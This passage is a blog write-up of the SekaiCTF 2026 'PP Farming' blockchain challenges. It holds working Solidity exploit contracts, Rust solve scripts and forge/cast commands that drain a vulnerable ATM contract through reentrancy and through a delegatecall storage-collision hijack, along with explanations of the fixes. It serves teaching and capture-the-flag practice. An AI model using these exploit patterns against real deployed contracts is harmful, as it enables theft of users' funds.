@@ -1,0 +1,1424 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="SekaiCTF 2026 blockchain writeup: draining PerformancePointATM twice, once via classic reentrancy and once via a delegatecall storage collision." />
+    <title>SekaiCTF Blockchain - mooofin</title>
+    <meta property="og:title" content="SekaiCTF Blockchain Writeups" />
+    <meta property="og:description" content="SekaiCTF 2026 blockchain writeup: draining PerformancePointATM twice, once via classic reentrancy and once via a delegatecall storage collision." />
+    <meta property="og:url" content="https://mooofin.github.io/portfolio/blog/pp-farming.html" />
+    <meta property="og:image" content="https://mooofin.github.io/portfolio/images/posts/pp-farming/banner.webp" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://mooofin.github.io/portfolio/images/posts/pp-farming/banner.webp" />
+    <link rel="stylesheet" href="../style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.min.css" />
+    <link rel="icon" href="../public/favicon.ico" />
+    <script>
+      MathJax = { tex: { inlineMath: [['$','$']], displayMath: [['$$','$$']] } };
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+    <style>
+      /* Blog specific styles */
+      .blog-content {
+        font-family: "Verdana", sans-serif;
+        line-height: 1.6;
+        font-size: 14px;
+      }
+      .blog-content h1,
+      .blog-content h2,
+      .blog-content h3 {
+        color: #000080;
+        margin-top: 20px;
+        border-bottom: 1px dotted #ccc;
+        padding-bottom: 5px;
+      }
+      .blog-content p {
+        margin-bottom: 15px;
+      }
+      .blog-content img {
+        max-width: 100%;
+        border: 1px solid #999;
+        padding: 4px;
+        background: #fff;
+      }
+      .blog-content .img-container {
+        text-align: center;
+        margin: 20px 0;
+      }
+      .blog-content pre {
+        background: #eee;
+        border: 1px inset #ccc;
+        padding: 10px;
+        overflow-x: auto;
+        font-family: "Courier New", monospace;
+      }
+      .blog-content code {
+        background: #f0f0f0;
+        padding: 2px 4px;
+        font-family: "Courier New", monospace;
+      }
+      .blog-content blockquote {
+        border-left: 4px solid #000080;
+        padding-left: 10px;
+        color: #555;
+        font-style: italic;
+        margin: 15px 0;
+      }
+      .blog-content table {
+        border-collapse: collapse;
+        width: 100%;
+        margin: 15px 0;
+        font-size: 13px;
+      }
+      .blog-content th,
+      .blog-content td {
+        border: 1px solid #999;
+        padding: 4px 8px;
+        text-align: left;
+      }
+      .blog-content th {
+        background: #d4d0c8;
+      }
+      .blog-meta {
+        color: #666;
+        font-size: 11px;
+        margin-bottom: 20px;
+        border-bottom: 1px solid #ccc;
+        padding-bottom: 10px;
+      }
+      .handout-box {
+        border: 2px inset #c0c0c0;
+        background: #d4d0c8;
+        margin: 15px 0;
+        padding: 6px;
+      }
+      .handout-tabs {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 2px;
+        margin-bottom: 6px;
+      }
+      .handout-tab {
+        font-family: "Verdana", sans-serif;
+        font-size: 11px;
+        padding: 4px 10px;
+        background: #d4d0c8;
+        border: 2px outset #fff;
+        cursor: pointer;
+      }
+      .handout-tab:hover {
+        background: #e4e0d8;
+      }
+      .handout-tab.active {
+        border: 2px inset #fff;
+        background: #fff;
+        font-weight: bold;
+      }
+      .handout-pane {
+        display: none;
+        margin: 0;
+        max-height: 420px;
+      }
+      .handout-pane.active {
+        display: block;
+      }
+      .blog-content pre code { background: none; padding: 0; border: none; }
+      .hljs { background: #fafaf8; }
+      .hljs-keyword { color: #b0306a; }
+      .hljs-string { color: #2d6a2d; }
+      .hljs-comment { color: #808080; font-style: italic; }
+      .hljs-number { color: #7a2d8a; }
+      .hljs-type { color: #c06030; }
+      .hljs-literal { color: #d49080; }
+      .hljs-built_in { color: #7a2d8a; }
+      .hljs-title.class_ { color: #212529; }
+      .hljs-title.function_ { color: #212529; }
+      .hljs-attr { color: #b0306a; }
+      .hljs-params { color: #424242; }
+      .hljs-meta { color: #c06030; }
+      .hljs-meta .hljs-keyword { color: #c06030; }
+      .hljs-symbol { color: #2d6a2d; }
+      .hljs-section { color: #b0306a; }
+      .hljs-selector-tag { color: #b0306a; }
+      .hljs-addition { color: #2d6a2d; }
+      .hljs-deletion { color: #a04040; }
+    </style>
+  </head>
+  <body>
+    <div class="desktop flex gap-16" style="flex-direction: row">
+      <div class="sidebar-95">
+        <div class="window">
+          <div class="window-title">
+            <img
+              src="https://win98icons.alexmeub.com/icons/png/computer-3.png"
+              class="icon-16"
+              alt=""
+            />
+            Navigation
+          </div>
+          <div class="window-body" style="padding: 0">
+            <ul class="list-group" style="border: none">
+              <li class="list-group-item">
+                <a href="../index.html">
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/directory_open_cool-1.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  Home
+                </a>
+              </li>
+              <li class="list-group-item">
+                <a href="../about.html">
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/users-1.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  About Me
+                </a>
+              </li>
+              <li class="list-group-item">
+                <a href="../projects.html">
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/directory_folder_options-5.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  Projects
+                </a>
+              </li>
+              <li class="list-group-item">
+                <a href="../blog.html">
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/notepad-0.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  Blog
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div class="window">
+          <div class="window-title">
+            <img
+              src="https://win98icons.alexmeub.com/icons/png/gear-0.png"
+              class="icon-16"
+              alt=""
+            />
+            Actions
+          </div>
+          <div class="window-body" style="padding: 0">
+            <ul class="list-group" style="border: none">
+              <li class="list-group-item">
+                <a href="javascript:history.back()">
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/undo-0.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  Go Back
+                </a>
+              </li>
+              <li class="list-group-item">
+                <a
+                  href="#"
+                  onclick="
+                    window.scrollTo(0, 0);
+                    return false;
+                  "
+                >
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/arrow_up-0.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  Top of Page
+                </a>
+              </li>
+              <li class="list-group-item">
+                <a href="../blog.html">
+                  <img
+                    src="https://win98icons.alexmeub.com/icons/png/notepad-0.png"
+                    class="icon-16"
+                    alt=""
+                  />
+                  All Posts
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div style="display: flex; flex-wrap: wrap; gap: 3px; margin-top: 4px;">
+          <img src="../images/gif-longbuterflycolors.gif" alt="butterfly" style="image-rendering: pixelated;" />
+        </div>
+      </div>
+
+      <div class="content-95">
+        <div class="window" style="margin-bottom: 8px">
+          <div class="window-body" style="padding: 4px 8px; font-size: 11px">
+            <img
+              src="https://win98icons.alexmeub.com/icons/png/directory_open_cool-1.png"
+              class="icon-16"
+              alt=""
+            />
+            <a href="../index.html">Home</a> &gt;
+            <a href="../blog.html">Blog</a> &gt; SekaiCTF Blockchain
+          </div>
+        </div>
+        <div class="window">
+          <div class="window-title">
+            <img
+              src="https://win98icons.alexmeub.com/icons/png/write_wordpad-0.png"
+              class="icon-16"
+              alt=""
+            />
+            SekaiCTF Blockchain
+          </div>
+          <div class="window-body">
+            <div class="blog-meta">
+              <img
+                src="https://win98icons.alexmeub.com/icons/png/clock-0.png"
+                class="icon-16"
+                alt=""
+              />
+              Posted: 2026-07-01 |
+              <img
+                src="https://win98icons.alexmeub.com/icons/png/user-0.png"
+                class="icon-16"
+                alt=""
+              />
+              Author: Siddharth |
+              <img
+                src="https://win98icons.alexmeub.com/icons/png/directory_listing-0.png"
+                class="icon-16"
+                alt=""
+              />
+              Category: CTF / Blockchain
+            </div>
+            <div class="blog-meta">
+              <strong>Date:</strong> 2026-07-01 | <strong>Tags:</strong> SekaiCTF, Solidity, reentrancy, delegatecall, storage collision
+            </div>
+
+            <div class="blog-content">
+              <p>
+                SekaiCTF 2026 had a two-part blockchain chain called
+                <strong>PP Farming</strong>, and I ended up doing both back to
+                back with <strong>lil-l3ak</strong>. Finished 33rd/926. I do
+                DFIR mostly , WEB3 was a nice change of pace this time.
+              </p>
+              <div class="img-container">
+                <img src="../images/posts/pp-farming/scoreboard.png" alt="SekaiCTF 2026 scoreboard, team lil-l3ak" />
+                <p style="font-size: 12px; color: #666; margin-top: 4px;">Scoreboard mid-event, team lil-l3ak, 33rd/926.</p>
+              </div>
+
+              <p>
+                Both parts deploy a <code>PerformancePointATM</code> contract,
+                donate ETH into a personal score, withdraw it back out later.
+                Part one is basically a warm-up. Part two takes the exact
+                same contract, patches the obvious bug, and hides a worse one
+                right behind the patch, which honestly is the more
+                interesting design decision here lol
+
+              </p>
+              <p>
+                 Kept the
+                <a href="https://swcregistry.io/" target="_blank" rel="noopener">SWC registry</a>
+                open the whole time too, basically a CVE database for smart
+                contract bug classes if you haven't used it before.
+              </p>
+
+              <h1>Part 1: PP Farming, classic reentrancy</h1>
+              <div class="handout-box" data-handout="pp-farming">
+                <div class="handout-tabs">
+                  <button class="handout-tab active" data-file="atm">PerformancePointATM.sol</button>
+                  <button class="handout-tab" data-file="exploit">Exploit.sol</button>
+                  <button class="handout-tab" data-file="solve">solve.rs</button>
+                </div>
+                <pre class="handout-pane active" data-file="atm"><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract PerformancePointATM {
+    mapping(address => uint256) public scores;
+
+    constructor() payable {
+    }
+
+    function donatePP(address _to) public payable {
+        scores[_to] = scores[_to] + msg.value;
+    }
+
+    function checkPP(address _who) public view returns (uint256 score) {
+        return scores[_who];
+    }
+
+    function withdrawPP() public {
+        uint256 score = scores[msg.sender];
+        require(score > 0, "Nothing to withdraw");
+        (bool result, ) = msg.sender.call{value: score}("");
+        require(result, "Transfer failed");
+        scores[msg.sender] = 0;
+    }
+
+    function isSolved() view public returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    receive() external payable {}
+}</code></pre>
+                <pre class="handout-pane" data-file="exploit"><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPerformancePointATM {
+    function donatePP(address _to) external payable;
+    function withdrawPP() external;
+}
+
+contract Exploit {
+    IPerformancePointATM public target;
+    uint256 public count;
+
+    constructor(address _target) {
+        target = IPerformancePointATM(_target);
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "need 1 ether seed");
+        count = 0;
+        target.donatePP{value: msg.value}(address(this));
+        target.withdrawPP();
+    }
+
+    receive() external payable {
+        if (address(target).balance > 0 && count < 20) {
+            count++;
+            target.withdrawPP();
+        }
+    }
+
+    function drain(address payable to) external {
+        to.transfer(address(this).balance);
+    }
+}</code></pre>
+                <pre class="handout-pane" data-file="solve"><code class="language-rust">// PP Farming: reentrancy exploit.
+// withdrawPP sends ETH before zeroing scores[msg.sender] (SWC-107).
+// Exploit::attack seeds a score then reenters withdrawPP from receive()
+// until the ATM is dry.
+//
+// deps: ethers = { version = "2", features = ["abigen"] }, tokio = { version = "1", features = ["full"] }, eyre = "0.6"
+
+use ethers::prelude::*;
+use ethers::utils::{format_ether, parse_ether};
+use eyre::Result;
+use std::sync::Arc;
+
+abigen!(
+    Exploit,
+    r#"[constructor(address _target) function attack() external payable function drain(address to) external]"#
+);
+
+const RPC_URL: &str = "http://REPLACE_RPC";
+const PLAYER_KEY: &str = "REPLACE_PRIVKEY";
+const ATM_ADDR: &str = "REPLACE_ATM";
+
+#[tokio::main]
+async fn main() -> Result&lt;()&gt; {
+    let provider = Provider::&lt;Http&gt;::try_from(RPC_URL)?;
+    let wallet: LocalWallet = PLAYER_KEY.parse::&lt;LocalWallet&gt;()?.with_chain_id(1u64);
+    let client = Arc::new(SignerMiddleware::new(provider, wallet.clone()));
+    let atm: Address = ATM_ADDR.parse()?;
+
+    println!("player  {:?}", wallet.address());
+    println!("balance {} ETH", format_ether(client.get_balance(wallet.address(), None).await?));
+    println!("atm bal {} ETH", format_ether(client.get_balance(atm, None).await?));
+
+    let exploit = Exploit::deploy(client.clone(), atm)?.send().await?;
+    println!("exploit deployed at {:?}", exploit.address());
+
+    exploit.attack().value(parse_ether("1")?).send().await?.await?;
+    exploit.drain(wallet.address()).send().await?.await?;
+
+    println!("atm bal now {} ETH", format_ether(client.get_balance(atm, None).await?));
+    Ok(())
+}</code></pre>
+              </div>
+              <p>
+                First pass on the handout: <code>donatePP</code>,
+                <code>checkPP</code>, <code>withdrawPP</code>,
+                <code>isSolved</code>. Only one of those moves ETH
+                <em>out</em>, <code>withdrawPP</code>, so that's the one
+                worth reading closely.
+                It's a tiny bank: deposit ETH into a score for some address,
+                withdraw it back out later. Full contract:
+              </p>
+              <pre><code class="language-solidity">contract PerformancePointATM {
+    mapping(address => uint256) public scores;
+
+    function donatePP(address _to) public payable {
+        scores[_to] = scores[_to] + msg.value;
+    }
+
+    function withdrawPP() public {
+        uint256 score = scores[msg.sender];
+        require(score > 0, "Nothing to withdraw");
+        (bool result, ) = msg.sender.call{value: score}("");
+        require(result, "Transfer failed");
+        scores[msg.sender] = 0;
+    }
+
+    function isSolved() view public returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    receive() external payable {}
+}</code></pre>
+              <p>
+                Read <code>withdrawPP()</code> line by line, bc this is where
+                the bug lives:
+              </p>
+              <ol>
+                <li>Look up how much ETH <code>msg.sender</code> is owed.</li>
+                <li>Make sure it's more than zero.</li>
+                <li>Send that ETH out with <code>.call{value: score}("")</code>.</li>
+                <li>Only <em>after</em> the send succeeds, set the score back to zero.</li>
+              </ol>
+              <p>
+                Sm things to know is that in Solidity, a
+                <code>.call</code> that sends ETH to an address doesn't just move
+                money silently. If the recipient is a smart contract, that
+                <code>.call</code> actually <em>executes code</em> on the
+                recipient's side before returning control back to
+                <code>withdrawPP()</code>. If the recipient contract's code, running
+                during that window, calls <code>withdrawPP()</code> again, the
+                function sees the score is still nonzero (step 4 hasn't run yet) and
+                happily sends the ETH out a second time. And a third. And so on,
+                until the ATM's balance can't cover another payout.
+              </p>
+              <p>
+                Worth explaining why <code>.call</code> is even allowed to do this.
+                Solidity's older <code>transfer()</code> and <code>send()</code>
+                hard-capped the callee at 2300 gas, just enough to log an event,
+                nowhere near enough to make another external call. That gas ceiling
+                made reentrancy basically impossible in practice. Then
+                <a href="https://eips.ethereum.org/EIPS/eip-1884" target="_blank" rel="noopener">EIP-1884</a>
+                (Istanbul, 2019) repriced <code>SLOAD</code> from 200 to 800 gas,
+                and suddenly 2300 gas wasn't enough for some completely innocent
+                <code>receive()</code> functions. Contracts that only wanted to log
+                a balance update were reverting. The community dropped
+                <code>transfer()</code> and <code>send()</code> and moved to
+                <code>.call{value: x}("")</code>, which forwards all remaining gas
+                and never reverts on the sender's behalf. Safer for delivery, worse
+                for reentrancy. This contract uses <code>.call</code> and doesn't
+                zero the balance first, so it gets both downsides.
+              </p>
+              <p>
+                This bug class has a name as well :
+                <a href="https://swcregistry.io/docs/SWC-107/" target="_blank" rel="noopener">reentrancy (SWC-107)</a>,
+                the same bug class behind
+                <a href="https://www.gemini.com/cryptopedia/the-dao-hack-makerdao" target="_blank" rel="noopener">the 2016 DAO hack</a>.
+                The fix has a name too:
+                <a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy" target="_blank" rel="noopener">checks-effects-interactions (CEI)</a>.
+                SO  do your checks (require statements), then your
+                effects (state changes like zeroing the score), and only then
+                your interactions (external calls). This contract does checks,
+                then interaction, then effects. Effects and interaction are
+                swapped, and that's the bug. OpenZeppelin's
+                <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard" target="_blank" rel="noopener"><code>ReentrancyGuard</code></a>
+                is the standard off-the-shelf fix for this in production code.
+              </p>
+              <p>
+                To exploit it we need a
+                contract that, when it receives ETH, calls
+                <code>withdrawPP()</code> again on every incoming transfer.
+                Solidity's <code>receive()</code> fires automatically when a
+                contract receives plain ETH with no calldata. Our hook:
+              </p>
+              <pre><code class="language-solidity">contract Exploit {
+    IPerformancePointATM public target;
+    uint256 public count;
+
+    constructor(address _target) {
+        target = IPerformancePointATM(_target);
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "need 1 ether seed");
+        target.donatePP{value: msg.value}(address(this));
+        target.withdrawPP();
+    }
+
+    receive() external payable {
+        if (address(target).balance > 0 && count < 20) {
+            count++;
+            target.withdrawPP();
+        }
+    }
+
+    function drain(address payable to) external {
+        to.transfer(address(this).balance);
+    }
+}</code></pre>
+              <p>
+                Full call stack for a single <code>attack()</code> transaction:
+              </p>
+              <div style="overflow-x:auto; margin: 16px 0;">
+$$
+\begin{array}{@{}ll}
+\texttt{Exploit.attack()} \\[5pt]
+\hspace{0.7em}\text{├─}\ \texttt{ATM.donatePP}\ (1\ \text{ETH}) \\[5pt]
+\hspace{0.7em}\text{└─}\ \texttt{ATM.withdrawPP()} & \scriptstyle\leftarrow\ \texttt{scores[exploit] = 1\ ETH} \\[5pt]
+\hspace{2.3em}\text{└─}\ \texttt{exploit.receive()} & \scriptstyle\leftarrow\ \text{re-enters; score not zeroed yet} \\[5pt]
+\hspace{3.8em}\text{└─}\ \texttt{ATM.withdrawPP()} & \scriptstyle\leftarrow\ \text{sees 1 ETH again, pays out} \\[5pt]
+\hspace{5.3em}\text{└─}\ \texttt{exploit.receive()} \\[5pt]
+\hspace{6.8em}\text{└─}\ \texttt{ATM.withdrawPP()} \\[5pt]
+\hspace{8.3em}\vdots \\[3pt]
+\hspace{7.8em}\scriptstyle\text{terminates when}\ \texttt{ATM.balance} = 0
+\end{array}
+$$
+              </div>
+              <p>
+                Let $B_i$ be the ATM balance after $i$ re-entrant withdrawals,
+                $d = 1\ \text{ETH}$ the seed:
+                $$B_0 = 10\ \text{ETH}, \quad B_{i+1} = B_i - d$$
+                Zero after $B_0 / d = 10$ frames. The
+                <code>count &lt; 20</code> cap guards against hitting the EVM's
+                call stack depth limit (1024) on a bigger target.
+              </p>
+              <p>
+                lets try to understand what happens now
+              </p>
+              <ol>
+                <li>
+                  <code>donatePP{value: msg.value}(address(this))</code> credits
+                  <em>this exploit contract's own address</em> with a score equal
+                  to whatever ETH we sent in (1 ether). Now
+                  <code>scores[exploitContract] == 1 ether</code> on the ATM.
+                </li>
+                <li>
+                  <code>target.withdrawPP()</code> makes the ATM look up our score
+                  (1 ether), then send it to us via <code>.call</code>.
+                </li>
+                <li>
+                  Because we're a contract and we just received plain ETH, our
+                  <code>receive()</code> fires automatically, <em>before</em> the
+                  ATM's <code>withdrawPP()</code> has finished running. It's
+                  still sitting on the line right after the <code>.call</code>,
+                  about to zero our score. But it hasn't zeroed it yet.
+                </li>
+                <li>
+                  Our <code>receive()</code> sees the ATM still has a balance and
+                  our re-entry counter is under the cap, so it calls
+                  <code>target.withdrawPP()</code> again. The ATM checks our score,
+                  still 1 ether since it was never zeroed, and pays
+                  us <em>again</em>.
+                </li>
+                <li>
+                  This repeats: every payout triggers <code>receive()</code>,
+                  which triggers another withdrawal, which triggers another
+                  payout. The <code>count &lt; 20</code> guard just stops us from
+                  looping forever once the ATM genuinely runs dry (each
+                  <code>.call</code> to an empty balance would revert without
+                  it, though realistically the ATM's balance hits zero and the
+                  <code>require(score > 0)</code> on any further stray call would
+                  fail first).
+                </li>
+              </ol>
+              <p>
+                One <code>attack()</code> call, 10 internal withdrawals, ATM
+                drained. Below is the live run against the instance, using
+                <code>foundry</code> (<code>forge</code> + <code>cast</code>).
+              </p>
+              <blockquote>
+                <strong></strong> A "wallet" is
+                just a keypair: a private key (secret, like a password) and a
+                public address (like an account number, safe to share). RPC
+                is the URL your tools use to talk to the blockchain, think of
+                it as the server address. "Gas" is the fee you pay in ETH to
+                get a transaction included in a block, basically a
+                processing fee. "Deploying a contract" means uploading code
+                to the chain, after which it lives at its own address and
+                anyone can call its functions. Every action below either
+                <em>reads</em> data off-chain for free (<code>cast call</code>,
+                <code>cast balance</code>) or <em>writes</em> by sending a
+                real transaction that costs a little gas
+                (<code>cast send</code>, <code>forge create</code>).
+              </blockquote>
+              <p>
+                <strong>Step 1, set up your environment and sanity-check
+                the starting state.</strong>
+                <code>cast wallet address</code> derives your public address from
+                the private key the challenge gave you (never share this key
+                outside the challenge), and <code>cast balance</code> just reads
+                an account's ETH balance off the chain.
+              </p>
+              <pre><code class="language-bash">cd blockchain_pp-farming
+export RPC_URL="https://eth.chals.sekai.team/&lt;instance-id&gt;/main"
+export PK="&lt;player private key&gt;"
+export ATM_ADDR="0x9e4b129391FC12248888f79d460Ee8Fe45405847"
+
+PLAYER=$(cast wallet address --private-key $PK)
+echo "Player: $PLAYER"
+cast balance $PLAYER --rpc-url $RPC_URL --ether
+cast balance $ATM_ADDR --rpc-url $RPC_URL --ether</code></pre>
+              <pre><code>Player: 0xC5FF8f52cc2D1889fA57e23483ba04CBFd5FD7D3
+1000.000000000000000000
+10.000000000000000000</code></pre>
+              <p>
+                The player wallet is funded with 1000 test ETH (plenty for gas and
+                the 1 ether seed donation), and the ATM sits at 10 ETH. That 10 ETH
+                is our target, <code>isSolved()</code> only flips true once
+                the ATM's balance hits exactly zero.
+              </p>
+              <p>
+                <strong>Step 2, compile and deploy the exploit
+                contract.</strong> <code>forge build</code> compiles every
+                <code>.sol</code> file in the project and catches syntax/type
+                errors before we spend gas. <code>forge create</code> then
+                deploys a specific contract to the chain, here we deploy
+                <code>Exploit</code>, passing the ATM's address as the constructor
+                argument.
+              </p>
+              <pre><code class="language-bash">forge build
+forge create --rpc-url $RPC_URL --private-key $PK --broadcast \
+    src/Exploit.sol:Exploit --constructor-args $ATM_ADDR</code></pre>
+              <pre><code>Deployer: 0xC5FF8f52cc2D1889fA57e23483ba04CBFd5FD7D3
+Deployed to: 0x140DA5fD33cCF31b89Ce8107906a4c4dACDf35D9
+Transaction hash: 0x76020dd47db36d793dbea06ebc2bab197effb1a0f0248439f0eaa73a4d0747b1</code></pre>
+              <p>
+                Save that <code>Deployed to</code> address, that's our
+                attacker contract.
+              </p>
+              <p>
+                <strong>Step 3, fire the attack.</strong>
+                <code>cast send</code> submits a real transaction that calls a
+                function and waits for it to be mined. We're calling
+                <code>attack()</code> and attaching 1 ether via
+                <code>--value 1ether</code>, which becomes <code>msg.value</code>
+                inside the contract, that's the seed donation the exploit
+                needs before it can start withdrawing.
+              </p>
+              <pre><code class="language-bash">export EXPLOIT="0x140DA5fD33cCF31b89Ce8107906a4c4dACDf35D9"
+cast send $EXPLOIT 'attack()' --value 1ether --rpc-url $RPC_URL --private-key $PK</code></pre>
+              <pre><code>blockNumber          3
+gasUsed              156830
+status               1 (success)
+transactionHash      0x9b98a37e80f5ea30fd915398a20f6f440252524a27b96a5dccd5fc5668a4bbd0
+to                   0x140DA5fD33cCF31b89Ce8107906a4c4dACDf35D9</code></pre>
+              <p>
+                <code>status 1 (success)</code> means the whole chain of internal
+                calls (donate, withdraw, re-enter, withdraw, re-enter, and so on)
+                completed without reverting. All of that happened
+                inside this single transaction; there was no need to send a
+                separate transaction per re-entry, because reentrancy attacks
+                unfold entirely within the call stack of one outer transaction.
+                .
+              </p>
+              <p>
+                <strong></strong> Now lets
+                read the chain state back to prove it worked.
+              </p>
+              <pre><code class="language-bash">cast balance $ATM_ADDR --rpc-url $RPC_URL --ether
+cast call $ATM_ADDR "isSolved()(bool)" --rpc-url $RPC_URL</code></pre>
+              <pre><code>0.000000000000000000
+true</code></pre>
+              <p>
+                The ATM's balance went from 10 ETH to exactly 0, and
+                <code>isSolved()</code> confirms it. It's a read-only
+                <code>view</code> function, so <code>cast call</code> (not
+                <code>cast send</code>) is enough since it costs no gas and
+                changes no state.
+              </p>
+              <pre><code>SEKAI{3Z_re3ntr4ncy_atTack5}</code></pre>
+              <p>
+                
+              </p>
+              <table>
+                <tr><th>Block</th><th>Tx hash</th><th>Action</th></tr>
+                <tr><td>2</td><td><code>0x76020dd4&hellip;747b1</code></td><td>Deploy <code>Exploit</code> contract</td></tr>
+                <tr><td>3</td><td><code>0x9b98a37e&hellip;a4bbd0</code></td><td><code>attack()</code>: donate 1 ETH, recursive <code>withdrawPP()</code> loop, ATM 10&nbsp;&rarr;&nbsp;0 ETH</td></tr>
+              </table>
+              <p>
+                 
+              </p>
+
+              <h1>Part 2: PP Farming 2, the sequel patches reentrancy, not the real bug</h1>
+              <div class="handout-box" data-handout="pp-farming-2">
+                <div class="handout-tabs">
+                  <button class="handout-tab active" data-file="atm2">PerformancePointATM.sol</button>
+                  <button class="handout-tab" data-file="evil">Evil.sol</button>
+                  <button class="handout-tab" data-file="solve2">solve.rs</button>
+                </div>
+                <pre class="handout-pane active" data-file="atm2"><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract PerformancePointHelper{
+    uint256 id_number;
+    address public atm;
+    bool public helping;
+    constructor() {
+        id_number = 0;
+        helping = true;
+    }
+    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
+        (bool success, ) = recipient.call{value: amount}("");
+        return success;
+    }
+    function setATM(address _atm) public {
+        atm = _atm;
+    }
+    function stopHelping() public {
+        helping = false;
+    }
+    function startHelping() public {
+        helping = true;
+    }
+}
+
+contract PerformancePointATM {
+    mapping(address => uint256) public scores;
+    address public performancePointHelper;
+    bool public locked;
+    constructor(address _performancePointHelper) payable {
+        performancePointHelper = _performancePointHelper;
+    }
+
+    modifier noReentrancy() {
+        require(!locked, "Reentrancy detected");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function donatePP(address _to) public payable {
+        scores[_to] = scores[_to] + msg.value;
+    }
+
+    function checkPP(address _who) public view returns (uint256 score) {
+        return scores[_who];
+    }
+
+    function withdrawPP() public noReentrancy {
+        uint256 score = scores[msg.sender];
+        require(score > 0, "Nothing to withdraw");
+
+        // Uses delegatecall to helper for withdrawal
+        (bool success, ) = performancePointHelper.delegatecall(
+            abi.encodeWithSignature("processWithdrawal(address,uint256)", msg.sender, score)
+        );
+
+        require(success, "Transfer failed");
+        scores[msg.sender] = 0;
+    }
+
+
+    function isSolved() view public returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    receive() external payable {}
+
+    // Calls proxy contract
+    fallback() external payable {
+        address _impl = performancePointHelper;
+
+        bytes4 selector = msg.sig;
+
+        // Block withdrawing without proxy
+        bytes4 initSelector = bytes4(keccak256("processWithdrawal(address,uint256)"));
+        require(selector != initSelector, "processWithdrawal blocked");
+
+        assembly {
+            let ptr := mload(0x40) // Get free memory pointer
+            calldatacopy(ptr, 0, calldatasize()) // Copy calldata to memory
+
+            let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0) // Delegatecall
+            returndatacopy(ptr, 0, returndatasize()) // Copy return data
+
+            if iszero(success) {
+                revert(ptr, returndatasize()) // Revert if delegatecall failed
+            }
+            return(ptr, returndatasize()) // Return data if successful
+        }
+    }
+}</code></pre>
+                <pre class="handout-pane" data-file="evil"><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract EvilHelper {
+    // runs in ATM storage context via delegatecall
+    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
+        (bool s, ) = recipient.call{value: address(this).balance}("");
+        return s;
+    }
+}</code></pre>
+                <pre class="handout-pane" data-file="solve2"><code class="language-rust">// PP Farming 2: storage-collision exploit via delegatecall hijack.
+// PerformancePointHelper::atm and PerformancePointATM::performancePointHelper
+// both sit at storage slot 1. fallback() delegatecalls anything except
+// processWithdrawal into the helper, so setATM(evil) silently repoints the
+// ATM's own storage. noReentrancy never fires, this isn't reentrant.
+//
+// deps: ethers = { version = "2", features = ["abigen"] }, tokio = { version = "1", features = ["full"] }, eyre = "0.6"
+
+use ethers::prelude::*;
+use ethers::utils::{format_ether, parse_ether};
+use eyre::Result;
+use std::sync::Arc;
+
+abigen!(
+    Atm,
+    r#"[function donatePP(address) external payable function withdrawPP() external function isSolved() external view returns (bool) function performancePointHelper() external view returns (address) function setATM(address) external]"#
+);
+abigen!(EvilHelper, r#"[constructor()]"#);
+
+const RPC_URL: &str = "http://REPLACE_RPC";
+const PLAYER_KEY: &str = "REPLACE_PRIVKEY";
+const ATM_ADDR: &str = "REPLACE_ATM";
+
+#[tokio::main]
+async fn main() -> Result&lt;()&gt; {
+    let provider = Provider::&lt;Http&gt;::try_from(RPC_URL)?;
+    let wallet: LocalWallet = PLAYER_KEY.parse::&lt;LocalWallet&gt;()?.with_chain_id(1u64);
+    let client = Arc::new(SignerMiddleware::new(provider, wallet.clone()));
+    let atm = Atm::new(ATM_ADDR.parse::&lt;Address&gt;()?, client.clone());
+
+    println!("legit helper: {:?}", atm.performance_point_helper().call().await?);
+
+    let evil = EvilHelper::deploy(client.clone(), ())?.send().await?;
+    println!("evil helper deployed at {:?}", evil.address());
+
+    atm.set_atm(evil.address()).send().await?.await?;
+    println!("hijacked helper: {:?}", atm.performance_point_helper().call().await?);
+
+    atm.donate_pp(wallet.address()).value(parse_ether("0.01")?).send().await?.await?;
+    atm.withdraw_pp().send().await?.await?;
+
+    println!("solved: {}", atm.is_solved().call().await?);
+    Ok(())
+}</code></pre>
+              </div>
+              <p>
+                Same as part one, diff the interface against what I
+                alr knew before reading a single line of logic. New stuff
+                here is that  <code>performancePointHelper</code>, <code>locked</code>,
+                a whole second contract (<code>PerformancePointHelper</code>),
+                and a <code>fallback()</code> I didn't ask for. An unexpected
+                catch-all handler is exactly the kind of thing that gets
+                flagged in an incident review, it's basically a shell listener
+                nobody remembers configuring. That's where I looked first,
